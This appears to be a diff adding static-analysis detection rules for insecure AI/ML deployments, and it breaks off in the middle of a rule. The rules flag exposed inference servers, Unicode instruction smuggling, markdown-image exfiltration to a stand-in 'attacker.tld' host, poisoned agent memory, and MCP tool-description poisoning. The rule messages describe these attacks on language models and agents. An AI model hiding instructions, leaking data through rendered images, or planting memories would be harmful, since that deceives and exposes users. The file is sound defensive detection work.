+  - python
+  - yaml
+  severity: ERROR
+  message: 'Ollama bound to 0.0.0.0 (OLLAMA_HOST or a compose/Docker port mapping)
+
+    exposes the server to the entire network. Ollama ships with no native
+
+    authentication, and CVE-2024-37032 ("Probllama") is a path-traversal
+
+    RCE reachable through the exposed API. Presence signal; confirm this
+
+    config is production-facing.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: OLLAMA_HOST\s*=\s*["']?0\.0\.0\.0
+    - pattern-regex: (?m)^\s*ENV\s+OLLAMA_HOST\s*=?\s*["']?0\.0\.0\.0
+    - pattern-regex: '"?0\.0\.0\.0:11434:11434"?'
+    - pattern-regex: -\s*["']?0\.0\.0\.0:11434
+    - pattern-regex: -\s*["']?11434:11434["']?\s*$
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: config
+    cwe:
+    - 668
+    - 200
+    - 306
+    original_engine: neuroscan
+    rule_name: Ollama server exposed on all interfaces
+    source_rule: AI142-1
+    residual:
+    - sanitizer
+- id: ns-aiml-101
+  languages:
+  - dockerfile
+  - python
+  - yaml
+  severity: ERROR
+  message: 'TorchServe management API bound to 0.0.0.0 (--management-address /
+
+    management_address) exposes model management (register/scale/unregister)
+
+    to the network. Combined with a public inference_address and a writable
+
+    model_store, this is the ShellTorch chain (CVE-2023-43654: SSRF via
+
+    model download -> RCE). Presence signal; confirm this config is
+
+    production-facing.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: --management-address\s*=?\s*["']?https?://0\.0\.0\.0
+    - pattern-regex: management_address\s*=\s*["']?https?://0\.0\.0\.0
+    - pattern-regex: inference_address\s*=\s*["']?https?://0\.0\.0\.0
+    - pattern-regex: '"?0\.0\.0\.0:8081:8081"?'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: config
+    cwe:
+    - 668
+    - 200
+    - 918
+    original_engine: neuroscan
+    rule_name: TorchServe management API exposed
+    source_rule: AI142-2
+    residual:
+    - sanitizer
+- id: ns-aiml-102
+  languages:
+  - dockerfile
+  - python
+  - yaml
+  severity: WARNING
+  message: 'Triton Inference Server running with --model-control-mode=explicit (or
+
+    poll) while --http-address/--grpc-address is not restricted to
+
+    localhost allows remote model load/unload/reconfiguration. See
+
+    CVE-2024-0087 and CVE-2024-0088. Presence signal; confirm this config
+
+    is production-facing.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: --model-control-mode\s*=\s*(explicit|poll)
+    - pattern-regex: --http-address\s*=\s*0\.0\.0\.0
+    - pattern-regex: --grpc-address\s*=\s*0\.0\.0\.0
+    - pattern-regex: '"?0\.0\.0\.0:8000:8000"?'
+    - pattern-regex: '"?0\.0\.0\.0:8001:8001"?'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: --http-address\s*=\s*127\.0\.0\.1
+  - pattern-not-regex: --grpc-address\s*=\s*127\.0\.0\.1
+  metadata:
+    category: config
+    cwe:
+    - 668
+    - 200
+    - 284
+    original_engine: neuroscan
+    rule_name: Triton Inference Server explicit model-control mode on public bind
+    source_rule: AI142-3
+    residual:
+    - sanitizer
+- id: ns-aiml-103
+  languages:
+  - dockerfile
+  - python
+  - yaml
+  severity: WARNING
+  message: 'BentoML serve/runner invocation explicitly binds to a non-localhost
+
+    host, exposing the pickle-based runner protocol to the network
+
+    (CVE-2024-2912: deserialization RCE in the runner server). The primary
+
+    fix for CVE-2024-2912 is version-based (upgrade BentoML) -- this rule
+
+    is presence-only and does not confirm the installed version is
+
+    vulnerable. Presence signal; confirm this config is production-facing.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: bentoml\s+serve\b[^\n]*--host\s+0\.0\.0\.0
+    - pattern-regex: bentoml\.Server\([^)]*host\s*=\s*["']0\.0\.0\.0
+    - pattern-regex: runner_host\s*=\s*["']0\.0\.0\.0
+    - pattern-regex: (?m)^\s*ENV\s+BENTOML_HOST\s*=?\s*["']?0\.0\.0\.0
+    - pattern-regex: '"?0\.0\.0\.0:3000:3000"?'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: config
+    cwe:
+    - 502
+    - 668
+    - 200
+    original_engine: neuroscan
+    rule_name: BentoML runner server bound to a public host
+    source_rule: AI142-4
+    residual:
+    - sanitizer
+- id: ns-aiml-104
+  languages:
+  - dockerfile
+  - python
+  - yaml
+  severity: WARNING
+  message: 'llama.cpp llama-server/server invoked with --host 0.0.0.0 and no
+
+    --api-key argument exposes the OpenAI-compatible completion API to the
+
+    network with no authentication. Presence signal; confirm this config
+
+    is production-facing.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?:llama-server|(?<![\w./])server)\b[^\n]*--host\s+0\.0\.0\.0
+    - pattern-regex: (?m)^\s*(?:CMD|ENTRYPOINT)\b[^\n]*llama-server[^\n]*--host\s+0\.0\.0\.0
+  - pattern-not-regex: --api-key\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: config
+    cwe:
+    - 668
+    - 200
+    - 306
+    original_engine: neuroscan
+    rule_name: llama.cpp server bound to all interfaces without an API key
+    source_rule: AI142-5
+    residual:
+    - sanitizer
+- id: ns-aiml-105
+  languages:
+  - dockerfile
+  - python
+  - yaml
+  severity: WARNING
+  message: 'vLLM''s OpenAI-compatible server (vllm serve / vllm.entrypoints.openai.
+
+    api_server) invoked with --host 0.0.0.0 and no --api-key exposes
+
+    completions/embeddings to the network with no authentication. This is
+
+    distinct from ns-aiml-038 (vLLM trust_remote_code deserialization risk)
+
+    -- this rule is purely about the missing API key on a public bind.
+
+    Presence signal; confirm this config is production-facing.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: vllm\s+serve\b[^\n]*--host\s+0\.0\.0\.0
+    - pattern-regex: vllm\.entrypoints\.openai\.api_server\b[^\n]*--host\s+0\.0\.0\.0
+    - pattern-regex: (?m)^\s*(?:CMD|ENTRYPOINT)\b[^\n]*vllm[^\n]*--host\s+0\.0\.0\.0
+  - pattern-not-regex: --api-key\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: config
+    cwe:
+    - 668
+    - 200
+    - 306
+    original_engine: neuroscan
+    rule_name: vLLM OpenAI-compatible server bound to all interfaces without an API key
+    source_rule: AI142-6
+    residual:
+    - sanitizer
+- id: ns-aiml-106
+  languages:
+  - dockerfile
+  - python
+  - yaml
+  severity: ERROR
+  message: 'Jupyter started with an empty --NotebookApp.token/--ServerApp.token,
+
+    or with --allow-root combined with a public bind (--ip=0.0.0.0), is
+
+    one of the most common initial-access vectors on GPU boxes -- anyone
+
+    reaching the port gets an unauthenticated code-execution notebook.
+
+    Presence signal; confirm this config is production-facing.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: --NotebookApp\.token\s*=\s*["']{2}
+    - pattern-regex: --ServerApp\.token\s*=\s*["']{2}
+    - pattern-regex: --allow-root\b[^\n]*--ip\s*=?\s*0\.0\.0\.0
+    - pattern-regex: --ip\s*=?\s*0\.0\.0\.0[^\n]*--allow-root\b
+    - pattern-regex: (?m)^\s*(?:CMD|ENTRYPOINT)\b[^\n]*jupyter[^\n]*--allow-root[^\n]*0\.0\.0\.0
+    - pattern-regex: '"?0\.0\.0\.0:8888:8888"?'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: auth
+    cwe:
+    - 668
+    - 306
+    - 200
+    original_engine: neuroscan
+    rule_name: Jupyter exposed with no auth token or as root on a public bind
+    source_rule: AI142-7
+    residual:
+    - sanitizer
+- id: ns-aiml-107
+  languages:
+  - generic
+  severity: ERROR
+  message: 'Characters in the Unicode Tags block (U+E0000-U+E007F) render as
+
+    nothing visually but decode to ordinary ASCII -- a capable LLM reads
+
+    them as the underlying instruction. This block was deprecated for its
+
+    original (language-tagging) purpose and has no legitimate use in
+
+    source code, prompts, or documentation; its only current real-world
+
+    use is smuggling an invisible instruction past human review into a
+
+    system prompt, tool description, or instruction file (CLAUDE.md,
+
+    .cursorrules, copilot-instructions.md, MCP tool description fields).'
+  patterns:
+  - pattern-regex: '[󠀀-󠁿]'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 94
+    original_engine: neuroscan
+    rule_name: Unicode Tags block characters in source (ASCII smuggling)
+    source_rule: AI-UNI-1
+    residual:
+    - sanitizer
+  paths:
+    include:
+    - '*.py'
+    - '*.pyi'
+    - '*.js'
+    - '*.jsx'
+    - '*.mjs'
+    - '*.cjs'
+    - '*.ts'
+    - '*.tsx'
+    - CLAUDE.md
+    - AGENTS.md
+    - .cursorrules
+    - copilot-instructions.md
+    - '*.prompt.md'
+    - '*.md'
+    - '*.txt'
+    - '*.json'
+- id: ns-aiml-108
+  languages:
+  - generic
+  severity: WARNING
+  message: 'Zero-width characters (ZWSP U+200B, Word Joiner U+2060, BOM/ZWNBSP
+
+    U+FEFF) or bidirectional text-direction overrides (U+202D LRO, U+202E
+
+    RLO -- the "Trojan Source" class, CVE-2021-42574) appear in this file.
+
+    These carry no visible glyph, or visually reorder the surrounding
+
+    text, while an LLM (or, for the bidi case, a human skimming the raw
+
+    byte order) reads something different from what renders. Legitimate
+
+    use is rare in these specific codepoints (unlike ZWJ/ZWNJ, deliberately
+
+    excluded here for their legitimate use in emoji sequences and Indic-
+
+    script conjunct rendering); in a prompt, tool description, or
+
+    instruction file this is a prompt-injection smuggling vector.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: "[​⁠\uFEFF]"
+    - pattern-regex: '[‭‮]'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 94
+    original_engine: neuroscan
+    rule_name: Zero-width or bidirectional-override characters in source (ASCII smuggling)
+    source_rule: AI-UNI-2
+    residual:
+    - sanitizer
+  paths:
+    include:
+    - '*.py'
+    - '*.pyi'
+    - '*.js'
+    - '*.jsx'
+    - '*.mjs'
+    - '*.cjs'
+    - '*.ts'
+    - '*.tsx'
+    - CLAUDE.md
+    - AGENTS.md
+    - .cursorrules
+    - copilot-instructions.md
+    - '*.prompt.md'
+- id: ns-aiml-109
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: 'Markdown-to-HTML rendering detected with no image/link allow-list or
+
+    Content-Security-Policy reference nearby. If the rendered text can
+
+    include model output, a rendered `![](https://attacker.tld/?q=...)`
+
+    is a zero-click data exfiltration channel (exploited against
+
+    ChatGPT, Bard, Writer.com) -- the auto-loading <img> request leaks
+
+    whatever was interpolated into the URL on render, even with scripts
+
+    fully blocked. Heuristic awareness signal, not a confirmed
+
+    vulnerability; real dataflow from the model into the renderer is
+
+    covered by TNT-LLMOUT-006.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: markdown\.markdown\(
+    - pattern-regex: mistune\.(?:markdown|html)\(
+    - pattern-regex: commonmark\.commonmark\(
+    - pattern-regex: marked\(
+    - pattern-regex: react-markdown
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 200
+    - 829
+    original_engine: neuroscan
+    rule_name: Markdown rendering of LLM output without an image/link allow-list or CSP nearby
+    source_rule: AI-EXFIL-1
+    residual:
+    - sanitizer
+- id: ns-aiml-110
+  languages:
+  - python
+  severity: WARNING
+  message: 'A model-chosen tool/function name (tool_call.function.name or an
+
+    Anthropic tool_use content block''s .name) is used directly to key
+
+    getattr()/globals()/locals()/importlib.import_module() with no
+
+    visible allow-list check nearby. Hand-rolled (non-framework)
+
+    OpenAI/Anthropic/litellm tool-use loops that resolve the model''s
+
+    chosen tool name this way let the model invoke any attribute,
+
+    module-level name, or importable module reachable from that lookup
+
+    -- not just the intended tool set (OWASP LLM06 Excessive Agency,
+
+    MITRE ATLAS AML.T0053).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: getattr\(\s*\w+\s*,\s*\w+(?:\.function\.name|\[.function.\]\[.name.\])
+    - pattern-regex: globals\(\)\[\s*\w+(?:\.function\.name|\[.function.\]\[.name.\])
+    - pattern-regex: locals\(\)\[\s*\w+(?:\.function\.name|\[.function.\]\[.name.\])
+    - pattern-regex: importlib\.import_module\(\s*\w+(?:\.function\.name|\[.function.\]\[.name.\])
+    - pattern-regex: (?i)getattr\(\s*\w+\s*,\s*\w*(?:content_block|tool_use|tool_call|toolcall|cb|tc|block)\w*\.name\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 470
+    original_engine: neuroscan
+    rule_name: Raw reflection dispatch on a model-chosen tool name
+    source_rule: TNT-ML-012
+    residual:
+    - sanitizer
+- id: ns-aiml-111
+  languages:
+  - python
+  severity: WARNING
+  message: 'A memory-write call has no visible user_id/namespace argument (mem0
+
+    Memory().add()/$MEM.add()), or a LangGraph store.put()/aput() call
+
+    uses a namespace tuple made only of string literals -- i.e. a
+
+    namespace that cannot vary per caller. In a multi-user deployment
+
+    this writes into (or reads back from) a namespace shared across every
+
+    user of the process: one user''s injected memory ("remember that all
+
+    future refunds go to account X") becomes recallable in a different
+
+    user''s session (cross-user contamination, MITRE ATLAS AML.T0070).
+
+    Presence signal: confirm the write is genuinely unscoped, not scoped
+
+    by an argument this regex can''t see (e.g. a kwarg on a wrapped line).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)\b\w*(?:mem0|memory|mem_|recall|archival)\w*\.add\(
+    - pattern-regex: \bMemory\(\s*\)\s*\.\s*add\(
+    - pattern-regex: \bMemoryClient\(\s*\)\s*\.\s*add\(
+    - pattern-regex: (?i)\w*store\w*\.a?put\(\s*\(\s*["'][^"')]*["']\s*,\s*["']
+    - pattern-regex: (?i)\w*store\w*\.a?put\(\s*\(\s*["'][^"')]*["']\s*,\s*\)
+  - pattern-not-regex: user_id\s*=
+  - pattern-not-regex: \.append\(
+  - pattern-not-regex: \.add\(\s*\)
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: \b\w*(?:mem0|memory|mem_|recall|archival)\w*\.add\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=\s*\(|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \bMemory\(\s*\)\s*\.\s*add\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=\s*\(|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \bMemoryClient\(\s*\)\s*\.\s*add\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=\s*\(|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \w*store\w*\.a?put\(\s*\(\s*["'][^"')]*["']\s*,\s*["'](?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=\s*\(|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \w*store\w*\.a?put\(\s*\(\s*["'][^"')]*["']\s*,\s*\)(?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=\s*\(|session_id\s*=|tenant\w*\s*=)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 284
+    original_engine: neuroscan
+    rule_name: Agent-memory write missing per-user/session scoping
+    source_rule: TNT-ML-018
+    residual:
+    - sanitizer
+- id: ns-aiml-118
+  languages:
+  - python
+  severity: WARNING
+  message: 'A vector-store query call (Pinecone index.query(), Chroma
+
+    collection.query(), a LangChain-style vectorstore''s
+
+    similarity_search(), or a Qdrant client.search()/query_points()
+
+    keyed by collection_name=) has no visible namespace=/filter=/
+
+    where=/query_filter=/tenant/user_id argument. In a multi-tenant
+
+    app, an unscoped query searches the entire index/collection: one
+
+    user''s documents can be retrieved into another user''s context
+
+    (OWASP LLM08:2025 Vector and Embedding Weaknesses; Pinecone''s and
+
+    Weaviate''s own multi-tenancy docs prescribe namespace/tenant
+
+    scoping as the fix). Complements TNT-ML-004 (query-text taint,
+
+    rules/ml_taint.yaml) and NS-AIML-015 (write-path validation,
+
+    rules/ai_ml_neuroscan.yaml), neither of which covers a missing
+
+    read-path isolation scope. Presence signal: this regex has no
+
+    cross-line/AST view of the call site, so it cannot confirm the app
+
+    is actually multi-tenant, or that scoping isn''t applied via a kwarg
+
+    on a wrapped line a few lines away -- confirm this runs in a
+
+    multi-user request-handling context before treating it as a
+
+    confirmed vulnerability.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \b\w*(?:index|pinecone)\w*\.query\(
+    - pattern-regex: \b\w*(?:collection|chroma)\w*\.query\(
+    - pattern-regex: \.similarity_search\(
+    - pattern-regex: \.search\(\s*collection_name\s*=
+    - pattern-regex: \.query_points\(\s*collection_name\s*=
+  - pattern-not-regex: (?i)namespace\s*=
+  - pattern-not-regex: (?i)filter\s*=
+  - pattern-not-regex: (?i)where\s*=
+  - pattern-not-regex: (?i)query_filter\s*=
+  - pattern-not-regex: (?i)\btenant\b
+  - pattern-not-regex: (?i)user_id\s*=
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: auth
+    cwe:
+    - 284
+    - 863
+    original_engine: neuroscan
+    rule_name: Vector-store query missing tenant/namespace/filter scoping
+    source_rule: AI138-1
+    residual:
+    - sanitizer
+- id: ns-aiml-119
+  languages:
+  - python
+  severity: ERROR
+  message: 'A SQL query containing a pgvector distance operator (<-> L2, <=>
+
+    cosine, <#> inner product) is built with an f-string, %-format, or
+
+    string concatenation rather than a parameterized query. Complements
+
+    NS-SQLI-001 (generic raw-SQL presence, rules/neuroscan.yaml): this
+
+    isolates the embedding-similarity-query shape specifically, and
+
+    complements the SQLi taint rules (TNT-SQLI-001 rules/web_taint.yaml,
+
+    TNT-SQLI-002 rules/python_taint_extended.yaml), which trace
+
+    cross-statement/cross-function flow -- this rule catches the
+
+    inline, single-statement interpolation case those can miss. If any
+
+    part of the interpolated value is attacker-controlled, this is SQL
+
+    injection with the same cross-tenant-retrieval consequence as an
+
+    unscoped vector-store query: the WHERE clause (including any
+
+    tenant/ACL predicate) can be widened or removed entirely.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?=.*(?:<->|<=>|<#>)).*\bf['"]
+    - pattern-regex: (?=.*(?:<->|<=>|<#>)).*\.format\(
+    - pattern-regex: (?=.*(?:<->|<=>|<#>))['"].*['"]\s*%
+    - pattern-regex: (?=.*(?:<->|<=>|<#>))['"].*['"]\s*\+
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: sql\.SQL\(
+  - pattern-not-regex: sql\.Identifier\(
+  - pattern-not-regex: sql\.Literal\(
+  metadata:
+    category: injection
+    cwe:
+    - 89
+    original_engine: neuroscan
+    rule_name: pgvector similarity query built via string interpolation
+    source_rule: AI138-2
+    residual:
+    - sanitizer
+- id: ns-aiml-112
+  languages:
+  - python
+  severity: INFO
+  message: 'archival_memory_insert()/core_memory_append()/core_memory_replace()
+
+    is defined or called. In Letta/MemGPT these are registered
+
+    agent-callable tools: the model itself decides both when to write and
+
+    what content to persist, so any untrusted content that reached the
+
+    model''s context (user input, a document, another tool''s result) can
+
+    end up as standing agent memory with no source expression a same-file
+
+    taint trace can follow -- the model''s tool-call decision is the
+
+    boundary crossing, not a value assignment. This is a structural
+
+    awareness signal about how Letta''s memory model works, not a claim
+
+    that Letta itself is vulnerable: Letta legitimately implements this
+
+    feature. Treat whatever the model chooses to write here as untrusted
+
+    input the next time it is recalled into a prompt (see TNT-ML-016).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bdef\s+archival_memory_insert\s*\(
+    - pattern-regex: \barchival_memory_insert\s*\(
+    - pattern-regex: \bdef\s+core_memory_append\s*\(
+    - pattern-regex: \bcore_memory_append\s*\(
+    - pattern-regex: \bdef\s+core_memory_replace\s*\(
+    - pattern-regex: \bcore_memory_replace\s*\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 284
+    original_engine: neuroscan
+    rule_name: Letta-style agent-callable memory-write tool
+    source_rule: TNT-ML-018
+- id: ns-aiml-120
+  languages:
+  - python
+  severity: WARNING
+  message: 'A `while True:`/`while 1:` loop with no iteration-cap term (
+
+    max_iterations/max_turns/max_steps/max_loops/recursion_limit/
+
+    iteration_limit/MAX_ITER/deadline/time.time()/time.monotonic()) within
+
+    10 lines. Agent "reflection" loops that call a completion API and
+
+    rely on the MODEL''s own output to decide when to stop (e.g. `if "DONE"
+
+    in reply: break`) are still unbounded from a cost/availability
+
+    standpoint -- termination must be CODE-controlled (a counter compared
+
+    against a fixed limit, or a wall-clock deadline), not model-decided,
+
+    or a misbehaving/adversarially-steered model can loop indefinitely
+
+    and exhaust the token/rate budget (Sourcegraph Cody and multiple
+
+    OpenAI-bill-runaway postmortems are this exact loop-amplification
+
+    shape). Engine limitation: this regex-based signal cannot verify a
+
+    completion API call is actually inside the loop body, or that a
+
+    `break` statement it does find is code-controlled rather than
+
+    model-controlled -- it only checks for the ABSENCE of a recognized
+
+    cap term nearby. Triage against the loop body; a `while True:` with no
+
+    completion call at all is a false positive for this specific concern.'
+  patterns:
+  - pattern-regex: '\bwhile\s+(?:True|1)\s*:'
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 400
+    - 770
+    original_engine: neuroscan
+    rule_name: Unbounded while-True loop with no visible iteration cap
+    source_rule: TNT-ML-022
+    fix: 'Bound every agent/reflection loop with a code-controlled exit: a counter compared against a fixed max_iterations/max_turns,
+      or a wall-clock deadline check -- never rely solely on the model''s own output (e.g. a ''DONE'' sentinel) to terminate
+      the loop.'
+    residual:
+    - sanitizer
+- id: ns-aiml-121
+  languages:
+  - python
+  severity: INFO
+  message: 'A completion API call (.chat.completions.create/.completions.create/
+
+    .messages.create/openai.ChatCompletion.create/openai.Completion.create/
+
+    litellm.completion/litellm.acompletion/.text_generation) with no
+
+    max_tokens, max_completion_tokens, or max_new_tokens argument within 10
+
+    lines. Provider defaults, where a cap is optional, can be the model''s
+
+    own maximum context/output length -- combined with no rate limiting,
+
+    each request can cost as much as the model allows. This is a
+
+    heuristic INFO-level surface signal, not a confirmed vulnerability:
+
+    the regex engine cannot verify this call site is a request/route
+
+    handler specifically (that structural recognition -- GitHub issue
+
+    #122''s cross_file.py AST pass -- is not reachable from a regex-mode
+
+    rule), so it fires on every completion call missing the kwarg,
+
+    including intentionally-unbounded offline/batch scripts. Triage
+
+    accordingly; low confidence by design (see the low-confidence INFO
+
+    convention other ns-aiml-* rules use).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \.chat\.completions\.create\(
+    - pattern-regex: \.completions\.create\(
+    - pattern-regex: \.messages\.create\(
+    - pattern-regex: openai\.ChatCompletion\.create\(
+    - pattern-regex: openai\.Completion\.create\(
+    - pattern-regex: litellm\.completion\(
+    - pattern-regex: litellm\.acompletion\(
+    - pattern-regex: \.text_generation\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 400
+    - 770
+    original_engine: neuroscan
+    rule_name: Completion API call with no max_tokens/max_completion_tokens cap
+    source_rule: TNT-ML-022
+    fix: Always pass an explicit max_tokens (or max_completion_tokens / max_new_tokens for the relevant SDK) upper bound to
+      every completion call, and pair it with request-level rate limiting on the endpoint.
+    residual:
+    - sanitizer
+- id: ns-aiml-122
+  languages:
+  - python
+  severity: INFO
+  message: 'A retry decorator (@retry/@tenacity.retry) or a same-line
+
+    `except ...: continue` retry idiom with no visible attempt-cap term
+
+    (stop=, stop_after_attempt(...), stop_after_delay(...), max_retries=,
+
+    an attempts/retries counter comparison) within 10 lines. An uncapped
+
+    retry wrapper around a completion call turns a transient failure (or
+
+    an attacker-inducible one, e.g. a deliberately malformed request that
+
+    always errors) into unbounded repeated billed API calls. Engine
+
+    limitation: this cannot verify the wrapped function actually calls a
+
+    completion API (only that a retry construct with no visible cap is
+
+    present) or verify the multi-line `except:\n    continue` shape (only
+
+    the same-line `except ...: continue` compact form is matched); INFO
+
+    severity reflects this lower confidence.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: '@(?:tenacity\.)?retry\b'
+    - pattern-regex: except\b[^:\n]*:\s*continue\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 400
+    - 770
+    original_engine: neuroscan
+    rule_name: Retry wrapper around a completion call with no attempt cap
+    source_rule: TNT-ML-022
+    fix: Cap every retry wrapper around a completion call with an explicit attempt limit (tenacity's stop=stop_after_attempt(N)
+      or stop_after_delay(N), or a counter compared against a fixed max in a hand-rolled retry loop).
+    residual:
+    - sanitizer
+- id: ns-aiml-123
+  languages:
+  - python
+  severity: WARNING
+  message: 'A completion call requests logprobs=True or a nonzero top_logprobs
+
+    with no nearby indication the value stays server-side. Per-token
+
+    log-probabilities materially cheapen model-extraction and
+
+    membership-inference attacks: Carlini et al. 2024 ("Stealing Part of
+
+    a Production Language Model") used a public logprob API to recover
+
+    the hidden-dimension size and an embedding projection matrix of
+
+    production models (including OpenAI''s) at low cost, and logprobs are
+
+    the standard oracle for membership-inference attacks against LLMs.
+
+    See OWASP LLM02:2025 (Sensitive Information Disclosure). Presence
+
+    signal only -- does not confirm the response actually reaches a
+
+    client-facing serialization call; see TNT-ML-023 for the
+
+    taint-confirmed variant of this same finding.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: logprobs\s*=\s*True
+    - pattern-regex: top_logprobs\s*=\s*\d+
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 200
+    original_engine: neuroscan
+    rule_name: Logprob/logit exposure to client (model-extraction surface)
+    residual:
+    - sanitizer
+- id: ns-aiml-124
+  languages:
+  - python
+  severity: INFO
+  message: 'embeddings.create() (or an equivalent embedding API call) is invoked
+
+    with no visible authentication decorator/dependency nearby. Text
+
+    embedding vectors are not opaque: Morris et al. showed embedding
+
+    inversion recovers a close approximation of the original input text
+
+    from the vector alone (see OWASP LLM02:2025). Returning raw
+
+    embeddings for request-derived text on an unauthenticated route lets
+
+    anyone reconstruct whatever text was embedded. Presence signal only
+
+    -- confirm the route is genuinely public and the vector is actually
+
+    returned to the caller, not consumed only for an internal similarity
+
+    search.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \.embeddings\.create\s*\(
+    - pattern-regex: openai\.Embedding\.create\s*\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: auth
+    cwe:
+    - 200
+    - 306
+    original_engine: neuroscan
+    rule_name: Embedding vector exposure on an unauthenticated route (embedding inversion)
+    residual:
+    - sanitizer
+- id: ns-aiml-125
+  languages:
+  - python
+  severity: WARNING
+  message: 'MCP tool description is not a fixed string literal -- it is a bare
+
+    variable/attribute reference, a function/method call result, or an
+
+    f-string that interpolates a non-literal expression. The tool
+
+    description is injected verbatim into the client model''s own context
+
+    window on every session; if the description can change after the
+
+    user approved the tool (fetched from a registry/config at import or
+
+    call time, computed from mutable state) the change is invisible to
+
+    the user and becomes an instruction-injection channel the user never
+
+    re-reviewed (Invariant Labs 2025 tool-poisoning / "rug pull"
+
+    disclosure). Presence signal only: a reference to a module-level
+
+    string constant would also match this heuristic; if the referenced
+
+    value is fixed at import time and never reassigned or fetched
+
+    remotely, this is a false positive -- inline it as a literal to
+
+    silence the finding, or confirm the value truly is static. Distinct
+
+    from NS-AIML-009 (which flags any exposed MCP tool regardless of its
+
+    description) and ns-aiml-066 (tool-call-smuggling on mcp.run/serve);
+
+    this rule is specifically about the description field as an
+
+    injection channel.
+
+
+    Scoped to a same-line tool-constructor/decorator call (Tool(,
+
+    FunctionTool(, StructuredTool(, BaseTool(, @mcp.tool(, @server.tool(,
+
+    @app.tool() -- a bare `description=` kwarg is far too common a name
+
+    (Pydantic model fields, argparse, unrelated dataclasses) to use as a
+
+    standalone signal, and this regex engine can''t verify multi-line call
+
+    membership. This trades recall on multi-line constructor calls
+
+    (`description=` on its own line inside a call opened elsewhere) for
+
+    eliminating the flood of unrelated `description=` kwargs this rule
+
+    matched before the same-line anchor was added.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?:\bTool|\bFunctionTool|\bStructuredTool|\bBaseTool|@mcp\.tool|@server\.tool|@app\.tool)\s*\([^()]*\bdescription\s*=\s*(?!["']|None\b|True\b|False\b)[A-Za-z_]\w*(?:\.\w+)*\s*[,)]
+    - pattern-regex: (?:\bTool|\bFunctionTool|\bStructuredTool|\bBaseTool|@mcp\.tool|@server\.tool|@app\.tool)\s*\([^()]*\bdescription\s*=\s*(?!["']|None\b|True\b|False\b)[A-Za-z_]\w*(?:\.\w+)*\s*\(
